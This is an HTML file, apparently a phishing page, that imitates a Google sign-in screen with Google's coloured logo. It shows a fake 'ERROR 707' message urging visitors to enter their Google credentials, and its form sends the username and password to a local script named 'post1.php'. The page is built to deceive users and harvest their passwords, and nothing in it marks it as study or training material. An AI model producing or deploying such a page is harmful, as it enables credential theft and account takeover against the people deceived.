<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logowanie</title>
    <style>
        body {
            font-family: Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 24px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 360px;
            max-width: 100%;
        }
        .login-container h3 {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #5f6368;
        }
        .login-container h2 {
            font-size: 48px;
            font-weight: 500;
            margin-bottom: 20px;
            text-align: center;
        }
        .login-container h2 span {
            display: inline-block;
        }
        .login-container h2 span:nth-child(1) { color: #4285F4; } /* Niebieski */
        .login-container h2 span:nth-child(2) { color: #EA4335; } /* Czerwony */
        .login-container h2 span:nth-child(3) { color: #FBBC05; } /* Żółty */
        .login-container h2 span:nth-child(4) { color: #4285F4; } /* Niebieski */
        .login-container h2 span:nth-child(5) { color: #34A853; } /* Zielony */
        .login-container h2 span:nth-child(6) { color: #EA4335; } /* Czerwony */

        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dcdfe1;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .login-container button:hover {
            background-color: #357ae8;
        }
        .login-container .forgot-password {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: block;
            margin-top: 10px;
        }
        .login-container .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </h2>
        <h3>ERROR 707: Enter your Google credentials to continue!</h3>
        <form action="post1.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <a href="#" class="forgot-password">Forgot email?</a>
        <a href="#" class="forgot-password">Need help?</a>
    </div>
</body>
</html>
